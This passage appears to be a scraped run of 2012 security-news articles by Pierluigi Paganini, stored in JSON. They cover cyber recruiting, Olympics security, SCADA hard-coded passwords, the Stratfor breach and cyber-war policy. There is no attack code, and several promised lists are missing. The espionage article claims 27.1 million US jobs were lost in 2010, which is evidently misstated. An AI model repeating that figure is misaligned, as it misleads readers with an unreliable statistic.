cyber army, just Chinese military referring US recruiting wrote on its official press:\n\n\u201cThe U.S. military is hastening to seize the commanding military heights on the Internet, and another Internet war is being pushed to a stormy peak,\u201d\n\n\u201cTheir actions remind us that to protect the nation\u2019s Internet security, we must accelerate Internet defense development and accelerate steps to make a strong Internet army.\u201d\n\nThe recruiting of hackers to train military expert is also conducted by other countries, India for example announced to have engaged two cyber security experts, who claimed to have cracked CERN\u2019s computer system.\n\nEthical hacker Chris Russo reported  that three times he found vulnerabilities in IT system of European Organization for Nuclear Research (CERN) that has been involved in discovery of \u2018God Particle\u2019 or Higgs Boson.\n\nThe experts are conducting a training sessions for Indian government officials.\n\nRusso declared:\n\n\u201cThe projections show there is going to be lot of manufacturing in the India. Lot of software will be involved in it. We are here to create awareness among people on probable vulnerabilities in the cyber system,\u201d\n\nThe training course was attended by officials from Cabinet secretariat, Airforce, C-DAC, National Technical Research Organization, Income Tax Department, Assam\u2019s AMTRON along with representatives from private sector entities, Aircel and Cisco.\n\nThe experts are partners of E2 Labs security firm, and  E2 Labs Managing Director Zaki Qureshey added\n\n\u201cNext era of wars is not going to be of bomb, gun and shells. It will be led by cyber warfare where most attack will be on nation\u2019s secret data. The idea to conduct such program evolved after seeing increase in cyber attack on India,\u201d\n\nI\u2019m completely agree the statement, the awareness and the training are necessary components of an proper cyber strategy.\n\nSenior Director Assocham Ajay Sharma said that talents required to build a team of cyber security experts are mostly available in people with an average age of below 30. That\u2019s way the government has also launched an interesting recruiting campaign.\n\nI desire to conclude the post with few simple reflections:\n\nWe are in front of the right way, but the path is very long and fraught with difficulties.\n\nPierluigi Paganini\n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/botnets", "topic_name": "Botnets"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/china", "topic_name": "China"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-strategies", "topic_name": "cyber strategies"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-threats", "topic_name": "cyber threats"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-warfare", "topic_name": "cyber warfare"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hackers", "topic_name": "Hackers"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hacktivism", "topic_name": "Hacktivism"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/ics-cert-report", "topic_name": "ICS-CERT report"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/mcafee", "topic_name": "McAfee"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/symantec", "topic_name": "Symantec"}]}, {"news_name": "Cyber security at large sporting events", "news_link": "https://securityaffairs.co/wordpress/7332/malware/cyber-security-at-large-sporting-events.html", "title": "Cyber security at large sporting events\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "July 15, 2012", "body": "\n\nby Ron Kelson, Pierluigi Paganini, David Pace\n\nThe London 2012 Olympics will bring together 10,500 athletes, diplomats, politicians, business leaders and millions of spectators from all over the world. Behind the scenes there is an immense effort being made to ensure the security and well-being of everyone participating, in any capacity, in this grand event. This article gives an inside-look into the thinking, business processes and security controls put in place to manage the risks in large sporting events. Many, but not all, of these principles and techniques can also be effectively applied by any business or organisation.\n\nThe basic process in preparing and securing any (business) system is:\n\nLarge prestigious sporting events represent a highly desirable target for terrorist and cyber criminals. These events attract a considerable number of athletes, and millions of spectators, who occupy confined places for a short period of time. The presence of major press agencies from around the world bring significant international visibility to these events. For politically motivated terrorists, there is the opportunity to cause violent disruption, which could severely injure many people and undermine confidence in the host country. For financially motivated cyber-criminals there is the opportunity to profit by attacking the personal and financial information of participants.\n\nIn the 2008 Beijing Olympics games, over 12 million cyber attacks per day, of varying types and lethality, were detected. Attacks range from denial of service attacks, propagation of viruses and malware, to highly targeted attacks against critical systems. Many, if not most, of these attacks were successfully defended in 2008. However, in the last four years, cyberspace and the related cyber threats have significantly evolved, increasing in sheer number, stealth, diversity, and capability for damage.\n\nA sporting competition must be considered in its entirety, as a monolithic system that is endowed with a series of access ports and exits. The inside of that system is composed of many people and devices exchanging huge quantities of data and are cooperating to achieve a common objective. In addition to this, we must consider the event as a \u201csystem of systems\u201d. This includes third party web-servers, email servers, the millions of personal computer systems remotely participating, and so on.\n\nIn the design of sporting events, every element is analysed in detail, the data it manages defined, the functions offered articulated, and the dependencies between various systems and services well understood.\n\nThe principal services that must be protected during an event are: 1) telecommunications, 2) internal financial services such as point of sale, 3) third party financial services such as online credit card transaction systems, 4) marketing and business communications, 5) public and private transportation, 6) organisational logistics, 7) public works, 8) public health and safety, 9) surveillance and reconnaissance, 10) policing services, and 11) military defence. Each of these services produce and process large amounts of data. 12) The security of social networks and other online websites the sporting event advertises and promotes its activities on, 13) the security of web-browsers and computers used by visitors to the event\u2019s websites, and 14) the identification and control of email scams and scam websites which attack those interested in the sporting event.\n\nThis last point (#14) is particularly interesting. Important sporting events are promoted on the Internet, with the publication of millions of images, videos, which lead to viral recommendations. This presents a unique opportunity to exponentially increase the spread of malware in social networks and other Internet mediums. For example, Kaspersky\u2019s experts have warned Internet users to be on their guard against cyber criminals using the Olympics to start marketing fake tickets and merchandise websites, phishing scams and DDoS attacks. Furthermore, foreign governments or large cyber-criminal organisations could use this opening as an opportunity to infiltrate a large number of computer systems to launch attacks completely unrelated to the sporting event itself.\n\nIt is clearly impossible to address all risks. However the highest risks in each category are addressed in a systematic way to protect the sporting event itself, and the participants / stakeholders involved.\n\nThere are a wide range of tactics, processes and technologies that are used to protect the different elements of a sporting event.\n\nConsider the internal networks that are the backbone of the sporting organisation. A good cyber defence strategy must protect that network from external attacks as well as internal attacks. Rigid policies must address every vulnerability and attack vector that could compromise that network, such as attacks through mobile devices and USB memory sticks. Possible attacks against the internal network backbone include targeted viruses designed to compromise the operations of critical sporting services.\n\nTo further reduce risks, different types of unrelated systems are isolated from each other. Gerry Pennell, chief information officer for London 2012, said that a key principle to ensure the security of the sporting event is to \u201ckeep mission-critical games systems quite isolated from anything web-facing. So very much partitioned and separated, thus making it hard for an external attack to succeed\u201d.\n\nUnfortunately, today one cannot rely on any computing or communication systems being secure, or the controls being perfect. To this end, event monitoring systems are used to track the (mis)behaviour of all systems, including collecting metrics such as network usage, number of completed transactions, suspicious transactions, and so on.\n\nThis type of monitoring occurs not just within the organisation, but also outside it. For example, starting several months before the events, law enforcement and security agencies monitor the web, especially social networks and forums, to identify any suspect activities that could be related to the organisation of an attack. Governments see this phase as really important because it may be possible to detect and neutralise a group of terrorists or hacktivists that are planning an action during the events.\n\nOne of the most effective ways to manage successful attacks and intrusions against specific components is to adopt hybrid techniques in the same system. For example, facial recognition systems and cryptographic cards for storing the digital identity of participants and organisers are just some of the overlapping security controls implemented during an event.\n\nFor critical services the sporting event must also assume that a successful compromise is possible, even after aggressive security controls have been put in place. To address this, backup systems, redundancy, and even diversity, are used to provide a secondary network backbone (redundancy) from components from a different vendor (diversity). For example, creating a wired network using one product from one vendor, and creating a wireless network using a different product from an entirely different vendor is done to try and avoid the same vulnerability being present (and thus exploitable) in both networks.\n\nTesting and monitoring are main priorities for the organisers of the event. The impact of simulated external and internal attacks against a typical workload of the network must be studied so we know what to look to detect real attacks. As regards the forthcoming London Olympics, each component of the IT infrastructure has been stressed in the period from March to May, simulating cyber attacks, and registering the response to the offences. The organisation said that a team of about 100 specialists will try to compromise the systems. Patrick Adiba from Atos, the Olympics IT supplier, told the BBC: \u201cWe are using a simulation system so it doesn\u2019t really matter if we corrupt the data. We simulate the effect and see how people react.\u201d\n\nThe unpredictable is always a constant companion in all endeavours, particularly large complex ones. To manage the unknown, the sporting organisation must be adequately equipped and staffed to meet any sudden unanticipated need rapidly. There must be a modest amount of human over-resourcing available to manage peak situations without compromising other activities.\n\nInstalling security controls and performing penetration testing are clearly critical steps. However, security is not achieved just by installing good security controls. Security is a process that must be actively managed long after initial preparations are completed.\n\nThis is best described in the Observation, Orientation, Decision and Action (OODA) loop. Event monitoring systems must be operational to observe the actual activity of all systems participating in the event. Analysis must be performed by security experts, with advanced technologies, in real-time to orientate themselves to any abnormalities and suspicious activities that could indicate an attack is in progress. If the experts determine there is a problem, a line of action must be decided on, and action taken to address that concern.\n\nThe security of a sporting event is extremely complex because of its sheer scale and the multitude of contributing factors. Due to the excellent work of private and public security organisations, previous Olympic events have been highly successful. Many of these winning processes and techniques can also be employed by medium to large organisations to protect the legitimate interests and well being of all stakeholders.\n\n \n\nSig.

It discusses the main vulnerabilities of critical systems exploitable by cyber attacks and possible solutions to implement to ensure their safety.\n\nOver the last years worldwide countries have discovered their critical infrastructures too vulnerable to cyber attacks due the increasing attention in cyber security matter and successfully attacks to SCADA systems. Events such as the spread of Stuxnet virus have alerted the international security community on the risks related to a cyber attacks and the relative disastrous consequences, we have learned how much powerful is a cyber weapon and which is real involvement of governments in cyber warfare.\n\nSCADA (supervisory control and data acquisition) is an industrial control system (ICS) used for the control and monitor of industrial processes, it is typically present in all those potential targets of a cyber attack such as a critical infrastructures or a utility facility.\n\nBeing related to industrial processes we find this family of devices everywhere, manufacturing, production, power generation and many times they are implemented to control of activities of critical systems such as water treatment and, electrical power transmission and distribution and large communication systems.\n\nThese components are privileged targets for cyber attacks, with a virus is possible to destroy the processes inside a nuclear plant as it happened in Natanz nuclear site during the offensive against Iran and its nuclear program. Western countries have been the first to explore the possibility of a cyber offensive using a cyber weapon such as a malware, the operation Olympic Games demonstrates the high attention of US government in cyber operations and the strong commitment provided by Bush administration first and after by the Obama one.\n\nThe scenario is really alarming, an attack on a SCADA system of a sensible structure could materialize the nightmare of every government, similar incidents can undermine the safety of millions of individuals and can compromise the homeland security. Dozens, hundreds, thousands of installations all over the world are potentially vulnerable to attack from anywhere on the planet, the offensive option is moved into what it is defined as the fourth dimension, the cyberspace, but that could also lead to the loss of many human lives.\n\nNot necessarily our minds must fly to a nuclear plant thinking to a possible accident in its control systems, we can think for example of the impact of an attack on the processes in a chemical plant. The main problem of SCADA systems is that they are in large number, each industrial process has its own, and many of them are exposed on internet without proper protection.\n\nWhich is the typical structure of a SCADA system?\n\nSCADA systems consist of the following components:\n\n\n\nFigure 1 \u2013 Scada Schema (Wikipedia)\n\nIn similar structure is possible to imagine several entry points for the external agents such as malware, the supervisory system is usually a computer based on the commercial OS for which is possible to exploit known vulnerabilities and in case of state sponsored attacks also 0-day vulnerabilities. Incidents occurred in SCADA systems have been demonstrated that these systems could be infected in different ways, we can imagine the inoculation of a virus through a USB stick or via a network interface.\n\nAfter the recent events many security firms have started the design of specific solutions to address security problems of SCADA systems, but the major challenge is for governments that have to include the protection of these critical components in their cyber strategies. Several audits executed by governments on their critical infrastructures have illustrated a dangerous scenario, the lack of security mechanisms for the many systems located all over the world, but it is really alarming the absence of a precise census of the SCADA systems for many of the principal industrialized countries.\n\nEvents such as the virus Stuxnet diffusion and the alleged incident to the water facility in Illinois occurred last year have shown to the world that it is possible to conduct a terrorist attacks on foreign state remotely, this has increased the awareness of cyber threats and the necessity to implement right countermeasures to mitigate the risks.\n\nDefense mechanisms virtually absent, the SCADA system components are often under the government of local authorities who do not deal with adequately trained personnel and that operates with limited budgets. This means that this kind of control devices is installed everywhere without being qualified in the installation phase. There are many systems deployed with factory settings, pre-set standard configurations and common to entire classes of devices. To this we add that even those who maintain them, should not exceed security, thus making it accessible for remote diagnostics without necessary attention.\nFortunately, something is changed, precise guidelines identify best practices to follow in the management of SCADA systems and operations groups monitor the operation of facilities around the country.\n\nThe last \u201cINTERNET SECURITY THREAT REPORT\u201d published by Symantec  reports that during 2011 have been detected several weaknesses in Critical Infrastructure Systems,  the security firm has seen a dramatic increase in the number of publicly-reported SCADA vulnerabilities from 15 in 2010 to 129 in 2011. Since the emergence of the Stuxnet worm in 2010 36, SCADA systems has attracted wider attention from security researchers. However, 93 of the 129 new published vulnerabilities were the product of just one security researcher.\n\nIn December the Industrial Control System \u2013 Cyber emergency Response Team (ICS-CERT) has distributed a new alert to provide timely notification to critical infrastructure owners and operators concerning threats or activity with a potential impact on critical infrastructure computing networks.\n\nICS-CERT informed that some models of the Modicon Quantum PLC used in industrial control systems contain multiple hidden accounts that use predetermined passwords to grant remote access Palatine, Illinois\u2013based Schneider Electric, the maker of the device, has produced fixes for some of the weaknesses and continues to develop additional mitigations. ICS-CERT encourages researchers to coordinate vulnerability details before public release.\n\nIn a SCADA system the programmable logic controllers (PLCs) are directly connected to in-field sensors that provide data to control critical component (e.g. Centrifugal or turbines). Often the default passwords are hard-coded into Ethernet cards the systems use to funnel commands into the devices, allowing administrators to remotely log into the machinery.\n\nAn independent security researcher Rub\u00e9n Santamarta reported that the NOE 100 and NOE 771 modules contain at least 14 hard-coded passwords, some of which are published in support manuals. Even in cases where the passcodes are obscured using cryptographic hashes, they are trivial to recover thanks to documented weaknesses in the underlying VxWorks operating system. As a result, an attacker can exploit the weakness to log into devices and gain privileged access to its controls.\n\nHard-coded passwords are a common weakness built into many industrial control systems, including some S7 series of PLCs from Siemens. Because the systems control the machinery connected to dams, gasoline refineries, and water treatment plants, unauthorized access are considered a national security threat because it could be used to sabotage their operation.\n\nDoing a search on the server search engine known as Shodan it\u2019s possible to discover what appear to be working links to several of the vulnerable Schneider models.  Santamarta said there is no fix for the devices other than to retire the faulty Ethernet cards and replace them with better-designed ones. The ICS-CERT advisory issued on December said the fixes from Schneider removes the telnet and Windriver services. The advisory made no mention of changes to FTP services.\nThe scenario is very worrying and reveals the need for a radical change, fortunately, the emergency has been perceived by most Nations. The ENISA (European Network Information Security Agency, has produced a recommendation for Europe and Member States on how to protect Industrial Control Systems. The document describes the current scenario of Industrial Control System security and proposes seven recommendations to improve it. The recommendations call for the creation of the national and pan-European ICS security strategies, the development of a Good Practices Guide on the ICS security, fostering awareness and education as well as research activities or the establishment of a common test bed and ICS-computer emergency response capabilities.\n\nIn June The Pacific Northwest National Laboratory (PNNL), a federal contractor to the U.S. Department of Energy (DOE), in collaboration with McAfee has published an interesting report entitled \u201cTechnology Security Assessment for Capabilities and Applicability in Energy Sector Industrial Control Systems: McAfee Application Control, Change Control, Integrity Control.\u201d\n\nhttp://www.mcafee.com/us/resources/reports/rp-energy-sector-industrial-control.pdf\n\nThe report provides an excellent picture of the current status of critical infrastructures and the effort spent to identify and fix vulnerabilities, in particular, it analyzes the value and effectiveness carefully integrated security solutions necessary to support the national security mission to secure industrial control system environments.\n\nVery meaningful is the statement said by Philip A. Craig Jr, Senior Cyber Security Research Scientist, a researcher within the National Security Directorate at the Pacific Northwest National Laboratory:\n\n\u201cWhen early critical infrastructure systems were created, neither security nor misuse of the interconnected network was considered\u201d\n\n \u201cToday, we are still focused on enhancing the security of control systems. Outdated security methods that use a maze of disparate, multi-vendor, and stacked security tools will only delay a cyber attack, providing numerous opportunities for a more advanced and modern cyber adversary to attack cyber security postures throughout critical infrastructure.\u201d\n\nThe document proposes a list of principal vulnerabilities that have been identified for control systems environments:\n\nFor now we have spoken of the possible vulnerabilities of the control systems without considering the principal reason of concern for critical infrastructures, the cyber warfare. Today cyber attacks have critically evolved into a sophisticated and carefully designed cyber weapon created with specific offensive intents, Stuxnet, Duqu and Flame are good examples.\n\nDr. Phyllis Scheck, Vice President and Chief Technology Officer, Global Public Sector, McAfee said\n\n\u201cInfrastructures that control systems affecting our everyday lives, such as smart grids, are rising in adoption yet still lack the proper security needed to prevent sophisticated cyber attacks, \u201c\n\n\u201cAchieving security by design is essential in securing critical infrastructure. Cybersecurity must be embedded into the systems and networks at the very beginning of the design process so that it becomes an integral part of the systems functioning.\u201d\n\nWhich are the principal solutions to prevent the exploits of vulnerabilities?\n\nWell, after the discovery of government programs for the design of cyber weapons that are able to exploit vulnerabilities present in the control system many security firms and experts of the same governments have invested in the project for the defense of critical infrastructures. Today there aren\u2019t cyber strategies that aren\u2019t considering the strategic importance of cyber defense. To give an idea of the possible solutions implemented for defensive and preventive purposes the PNNL report cites:\n\nConclusions \n\nThe SCADA systems are increasing in complexity, due to the integration of different components produced in many cases by different manufacturers it is necessary to address the security level of each device, but also on the overall environment, integration tests are fundamental during the deployment phase, the design approach must totally change and have to take care of all the possible cyber threats that could arm the systems.\n\nThere must be a collective effort by all governments to produce continuous report on the security status of critical infrastructures and related SCADA systems. The overall security will pass through a global collaboration and information sharing on the possible cyber threats and the vulnerabilities of every device that is qualified in the market.\n\nThe security component must become part of the project of the industrial system, it must be considered as a specific requirement, overall security of critical infrastructures must be audit during the entire lifecycle of its components.\n\nOnly following these recommendations we could defend our nation.\n\nPierluigi Paganini\n\nAbout the Author \n\nPierluigi Paganini has a Bachelor in Computer Science Engineering IT, majoring in Computer Security and Hacking techniques.

The practice of the cyber espionage could be perpetrated in a long interval of time causing dramatic problems, emblematic the case of Nortel firm that has terminated in bankruptcy.\n\nThe repercussion are serious on internal economy, the Commerce Department estimates that due cyber espionage have been lost around 27.1 million American jobs in 2010, 18.8 percent of all employment.\n\nThe MI5 chief presented a worrisome scenario, the UK industry suffers both state sponsored cyber espionage and organized cybercrime.\n\nThe espionage activities are not new, but the introduction of new technology has amplified the size of the phenomenon, Greg Wilshusen, Government Accountability Office director of information security issues, said:\n\n\u201cuse of cyberspace have vastly enhanced the reach and potential impact of such threats,\u201d\n\n \n\nThe problem of cyber espionage is also targeting businesses and government all over world, the Director General of MI5, Jonathan Evans, has recently declared that \u201cone major London listed company\u201d estimated that it had lost\n\n\u201csome \u00a3800m as a result of hostile state cyber attack \u2013 not just through intellectual property loss but also from commercial disadvantage in contractual negotiations.\u201d\n\n\n\nWhy choose to spy on a private firm or government in economic field?\n\nTechnological instruments such as malware represents a cheaper, and less risky, solution to steal sensible secrets.\n\nThe most active nations in this area are Russia and China but also countries such as Israel, US and Western States.\n\nLets conclude this rapid view on cyber espionage with a surprising data, China is world\u2019s biggest cyber attack victim according a recent report published by the National Computer Network Emergency Response Coordination Center of China.

The hacker gained access to a subscriber list stored on stratfor.com, and that list contained unencrypted credit card data.\n\nStratfor is an organization that gathers open source intelligence which markets publications for forecasting purposes, due of the confidentiality of information leaked the company will spend around $1.75 million to compensate its customers who have taken revenge with a class action.\n\nThe hacktivists of Anonymous during the attack leaked more over 200 GB of confidential data accessing to the database of the Stratfor.\n\n\n\nAnonymous exposed two lists of credit card details belonging to people who have subscribed to Stratfor services, the first one containing 3956 card details and the second one 13191 card details.\n\nIncluded in this list important names like Goldman Sachs, the Rockefeller Foundation and, MF Global.\n\nMost interesting part of leaked data is composed by millions of emails that were published on the Web this year by Julian Assange\u2019s WikiLeaks.\n\nThe data revealed uncomfortable truths, secret relationships between government\u2019s exponents, private companies and a network of informers all around the world.\n\nOf course many analysts have dissected the huge quantity of data searching for news compromising, it was revealed for example that within the stolen emails were communications between Stratfor analysts and law enforcement officers, exposing that the company\u2019s employees had contact the police to share information on the Occupy Wall Street movement.\n\nThe funny news is that after the hack within data leaked has been found personal datails related to around 4,000 Stratfor clients such as Bank of America, the US Defense Department and others, who had paid an identity protection service from CSID, a leading provider of global identity protection.\n\nUS District Judge Denis Hurley written an order that establish that Stratfor will have to compensate clients who subscribed to the company\u2019s updates prior to the Christmas Eve hack.\n\nStratfor does not have to admit any \u201cwrongdoing, fault, violation of law or liability of any kind,\u201d but will have to provide one month of free service to plaintiffs \u2014 a value of $29.08 \u2014 and offer an electronic copy of its publication The Blue Book, which regularly retails for $12.99. The entire settlement is expected to set the company back around $1.75 million.\n\nIn an order written by US District Judge Denis Hurley earlier this month, Stratfor will have to indemnify its clients damaged by the data breach.\n\nThe order reports that Stratfor does not have to admit any \u201cwrongdoing, fault, violation of law or liability of any kind,\u201d but will have to provide one month of free service to plaintiffs \u2014 a value of $29.08 \u2014 and offer an electronic copy of its publication The Blue Book, which regularly retails for $12.99.\n\nThe entire settlement is expected to set the company back around $1.75 million.\n\nPersonally I think the judgment is too light, there are evident liability of Stratfor, primarily the absence of encryption mechanisms for the storage of the confidential information. Another consideration on the hack, that does not bode well for the company, is the responsibility of having publicly exposed the network resources that contain valuable information, resources that are evidently not been adequately protected.\n\nObviously I think that the judgment has been weighted on the basis of reliable information that I ignore, without doubts the damage caused by the revelation of sensitive information is certainly much higher amounts of compensation.\n\nIs it consider the event as isolated or is there any danger of relapse?\n\nOf course no, government contractors and intelligence agencies are preferential targets for group of hacktivists due the sensible information that manage. The first categories, the government contractors, is characterized by another important factor that make it an excellent target for a cyber attack, usually they manage the same information of their government\u2019s clients but the mechanisms of protection of data are often absent or inadequate.\n\nThe case of HBGary Federal was emblematic, Aaron Barr, CEO of the company declared in 2010 to have collected information regarding Anonymous and its members.\n\nBarr claimed to have used intelligence techniques to infiltrate the group using principal social media (e.g. Facebook, Twitter). His intention was to release information on the identities of Anonymous members at the B-Sides conference and to sell it to law enforcement.\n\n\n\nOn February 5-6, 2011, Anonymous attacked the HBGary website stolen tens of thousands of documents from both HBGary Federal and HBGary, Inc., and posted tens of thousands of emails online. The hacktivist also hacked the Barr\u2019s twitter account\n\nOf course the information disclosed was embarrassing such us the support given to the Bank of America against the intention of Wikileaks to publish compromising documents. In the case the HBGary worked with support of others security companies, Palantir and Berico Technologies.\n\nAnother example of the revealed info was the documented service provided to the U.S. Air Force to manipulate social media to spread pro-government propaganda.\n\nIn many cases the contractors make the \u201cdirty works\u201d for companies and governments managing confidential documents, and not always implement the necessary protection to preserve the sensible information. The case of HBGary represents an exception, the major part of subcontractors have no security mechanism in place to defend their data. Since now we have spoken of intelligence companies that the events demonstrated vulnerable to external attacks, but we must take in care that many contractors simply provide logistic services or similar, but in any case they manage sensible information like the references of government employees.\n\nDon\u2019t forget that subcontractors are preferred targets also for foreign governments that intend to conduct cyber espionage operations.\n\nState sponsored attacks are more dangerous because differently from a typical operation of hacktivism, are silent and perpetrated in time with dramatic consequence. A state sponsored attack is quite different also in the mode of attack that uses to adopt also targeted malware.\n\nEvent like the ones exposed must alert on the real security level ensured for the protection of confidential information, the weakest ring of the chain could compromise the overall security chain.\n\nPierluigi Paganini\n\n \n\n", "topics": [{"topic_link": "https://securityaffairs.co/wordpress/tag/anonymous", "topic_name": "Anonymous"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-espionage", "topic_name": "cyber espionage"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/cyber-security", "topic_name": "cyber security"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/hbgary", "topic_name": "HBGary"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/intelligence", "topic_name": "Intelligence"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/malware-2", "topic_name": "malware"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/security-chain", "topic_name": "security chain"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/state-sponsored-attacks", "topic_name": "state-sponsored attacks"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/stratfor", "topic_name": "Stratfor"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/subcontractors", "topic_name": "subcontractors"}, {"topic_link": "https://securityaffairs.co/wordpress/tag/wikileaks", "topic_name": "Wikileaks"}]}, {"news_name": "The \u2018cyber war\u2019 era began long ago", "news_link": "https://securityaffairs.co/wordpress/6776/security/the-cyber-war-era-began-long-ago.html", "title": "The \u2018cyber war\u2019 era began long ago\t\t\t\t\t", "author": "Pierluigi Paganini", "author_link": "https://securityaffairs.co/wordpress/author/paganinip", "date": "June 25, 2012", "body": "by Ron Kelson, Pierluigi Paganini, Benjamin Gittins, David Pace \n\nUS military strategist John Boyd states:\n\n\u201cWar comprises acts of physical, biological, psychological, social, cultural and other destruction at all levels, for example, intrapsychic, interpersonal, intergroup, interorganisational, and international.\u201d\n\nCyber warfare is combat in cyberspace and includes computers, the Internet and the \u201csphere of human thought\u201d (Noosphere, Social Media). Cyber operations can be Kinetic (physical destruction) and Non-Kinetic (attacks against computers, intellectual property, financial systems, and the realm of ideas, opinions, beliefs and feelings). The boundaries between conventional operations (munitions, psychological) and cyber-operations is blurring, as cyber attacks begin to be used as a force multiplier in conventional operations.\n\nCyber warfare is generally different from cybercrime, with cybercrime seen as financially motivated, and cyber warfare as politically motivated. Cyber attacks that result in physical destruction of critical infrastructure or large loss of life are considered acts of war/terrorism. Cyber attacks can originate or be triggered from anywhere. Cyber warfare can be conducted by traditional nation-states and other actors. Paradoxically, cyber warfare can, and already does, take place during \u201cpeacetime\u201d periods when there is no conventional conflict occurring.\n\nIn recent years, the use of technological tools for military operations has increased significantly. Countries such as the USA, China, Israel and Russia, were the first to invest significantly in building cyber warfare capabilities. Today it is claimed that at least 140 countries are developing cyber weapons, which are seen as covert and highly cost effective. Not surprisingly, the number of cyber warfare operations has increased substantially. Every day there are thousands of attacks against government systems around the world due to offensive foreign states. Vast amounts of information are being stolen and time-delayed kinetic attacks are being installed in critical infrastructures. Predominantly, non-kinetic attacks still cause real damage and are still \u2018war\u2019.\n\nWhat are the main types of cyber warfare attacks?\n\nOffensive attacks for sabotage: The primary purpose of these kinds of operations is to destroy the target, typically critical infrastructure such as communication systems, power grids or transportation infrastructures. Economic systems are also key targets. For example, several stock markets have been attacked by foreign countries, as happened to the Israeli Tel Aviv stock exchange at the start of 2012.\n\nStuxnet malware is the best-known example of a cyber weapon (widely believed to be) developed by US and Israeli intelligence agencies. It is designed to sabotage the Iranian nuclear industry by attacking nuclear sites that were advancing their uranium enrichment programme.\n\nCyber espionage: The act of information gathering to obtain sensitive, proprietary or classified information from individuals and governments also for military, political, or economic advantage using illegal exploitation methods on the internet, networks, software and/or computers.\n\nThere are different types of cyber espionage depending on the scheme adopted to steal classified information that is not handled securely. The attacks could be conducted using malware to spy on victim systems, or by introducing/exploiting backdoors in software or hardware. Recently, one of the main concerns regarding the cyber espionage are the attacks to gather information through social networks. These platforms are a rich mine of information that could advantage an attacker, and the acquired data could represent a preparatory phase to a major (conventional) offensive.\n\n\n\nCyber weapons for cyber war\n\nThomas Rid and Peter McBurney state that a cyber weapon threatens security with significant legal, political and other consequences. The line between what is and is not a cyber-weapon is subtle.\n\nThey define \u201ccyber weapon\u201d as \u201ca computer code that is used, or designed to be used, with the aim of threatening or causing physical, functional, or mental harm to structures, systems, or living beings\u201d\n\nAn interesting classification of cyber weapons is based on a spectrum of actions. In this scale we introduce the following categories:\n\nTypically, the higher the potential for damage, the higher the cost and complexity of developing these cyber threats. Furthermore, high value targets require a significant amount of time and intelligence to discover enough information to develop specific targeted weapons. For this reason some parties seek to identify and exploit other actors\u2019 cyber offensive creations.\n\nDeveloping cyber war and conventional war capabilities are fundamentally different.\n\nAccording to Martin C. Libicki in the book Cyberdeterrence and Cyberwar prepared for the USAF:\n\n\u201cCyberspace is its own medium with its own rules. Cyber attacks, for instance, are enabled not through the generation of force but by the exploitation of the enemy\u2019s vulnerabilities.\u201d\n\nInvestment in cyber war started around 2006. Today, several intelligence studies claim that more than 140 countries have a cyber weapon development programme. One example is the $110 million US Defence Advanced Research Projects Agency (DARPA) dubbed \u201cPlan X\u201d (2012). Its goal is to harness computing power to help the US wage war more effectively (for example,.achieving kinetic effects). Plan X is part of a larger DARPA effort to create breakthrough offensive and defensive cyber-\u00adcapabilities. With a cyber budget of $1.54 billion from 2013 to 2017, DARPA will focus increasingly on cyber-offence to meet military needs, officials say.\n\nOne of the goals of Plan X is the creation of an advanced map that details the entirety of cyberspace \u2212 a global domain that includes tens of billions of computers and other devices [ed: your computers and mine] \u2212 and updates itself continuously. Such a map would help commanders identify targets and disable them, using computer code delivered through the Internet or other means. Michael V. Hayden, a former NSA and CIA director, said he could imagine a map with red dots representing enemy computers and blue dots representing American ones. When the enemy upgrades his operating system, the red dots would blink yellow, meaning the target is out of reach until cyber operators can determine what the new operating system is.\n\nBearing in mind Martin C. Libicki\u2019s statement: \u201cCyberattacks are enabled by the exploitation of the enemy\u2019s vulnerabilities,\u201d Libicki goes on to say: \u201cThe [cyberspace] medium is fraught with ambiguities; something that works today may not work tomorrow (indeed, precisely because it did work today).\u201d\n\nFor Plan X to provide a \u201creturn on investment\u201d to the United States, the billions of (civilian) computers connected to the Internet must have known exploitable vulnerabilities.\n\nConsequently, the designers of cyber war weapons will be incentivised to: a) identify vulnerabilities and keep them a secret from the open community, b) introduce exploitable vulnerabilities into the software and hardware of computers used in civilian and critical infrastructure applications. The same incentives hold true for the 140 countries that now have at least one cyber weapon development programme. Hold this thought for just one minute while we consider the other side of the coin.\n\nTo quote the US CyberSpace Policy Review:\n\n\u201cCyberspace touches practically everything and everyone. It provides a platform for innovation and prosperity and the means to improve general welfare around the globe. But great risks threaten nations, private enterprises, and individual rights. The government has a responsibility to address these strategic vulnerabilities together with the larger community of nations, \u201cOnly by working with international partners can the United States best address these challenges, enhance cyber security and reap the full benefits of the digital age.\u201d\n\nNo one can create a secure ICT ecosystem just for themselves because today\u2019s computers and software are sold in every nation to achieve the necessary economies of scale to make them cost-effective. In our interconnected and interdependent global village we can\u2019t create a secure \u201ccyberspace\u201d for international commerce if it is not globally secure.\n\nAccording to military strategist Carl von Clausewitz, \u201cWar is an act of violence to compel our opponent to fulfil our will,\u201d that is \u201cthe compulsory submission of the enemy to our will is the ultimate object. In order to achieve this object fully, the enemy must be disarmed.\u201d That is, they must be vulnerable and exposed.\n\nWill nation states invest in an effective cyber attack capability (and undermine the stability of the global community and their own nation), or will they invest in a truly effective common cyber defence? It is simply impossible to achieve an effective cyber defence if we deliberately leave exploitable vulnerabilities open to support cyber attack capabilities. There are important examples reported of parties discovering and exploiting government sponsored backdoors, such as one government\u2019s monitoring of pro-democracy activists through a backdoor in Google\u2019s Gmail, and monitoring of Greek government ministers phone 